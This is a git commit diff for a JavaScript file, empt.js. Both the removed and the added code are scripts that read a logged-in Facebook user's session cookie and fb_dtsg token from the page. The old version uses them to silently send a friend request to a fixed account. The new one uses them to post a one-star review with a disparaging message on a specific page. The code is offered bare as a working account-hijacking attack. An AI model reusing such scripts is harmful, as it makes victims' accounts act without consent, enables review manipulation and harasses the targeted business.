5c07177954737a85a21b25ec7155f400f1e66984
elmahbol <elmahbol@users.noreply.github.com>
2016-02-08 17:33:46 +0200

    Update empt.js

--- empt.js
+++ empt.js
@@ -1,10 +1,10 @@
- var X = new XMLHttpRequest();
-var XURL = "//www.facebook.com/ajax/add_friend/action.php?__pc=EXP1%3ADEFAULT";
-var XParams = "&to_friend=100003085666469&action=add_friend&how_found=profile_button&ref_param=tl_fr_box&link_data[gt][profile_owner]=100004240184193&link_data[gt][ref]=timeline:timeline&outgoing_id=&logging_location=&no_flyout_on_click=true&ego_log_data&http_referer=https://www.facebook.com/?ref=tn_tnmn&floc=profile_button&frefs[0]=tl_fr_box&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=&confirmed=1";
-X.open("POST", XURL, true);
-X.onreadystatechange = function () {
-if (X.readyState == 4 && X.status == 200) {
-X.close;
-}
-};
-X.send(XParams);
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/pages/review/add?mechanism=inline_rating&send_reviews_feed_markup=1&__pc=EXP1%3ADEFAULT";
+  var XParams = "&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"%3AAQHw-nU4gS90&id=289226391273473&ref=page_review_tab&id_to_replace=&source=11&rating=1&note_message=Worst%20trip%20and%20worst%20organizers%20ever%0APlease%20Do%20not%20ever%20use%20and%20better%20to%20report%20this%20useless%20page%20as%20well%0A&audience[8787770733][value]=80&done_button=1&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&__dyn=&__req=&ttstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
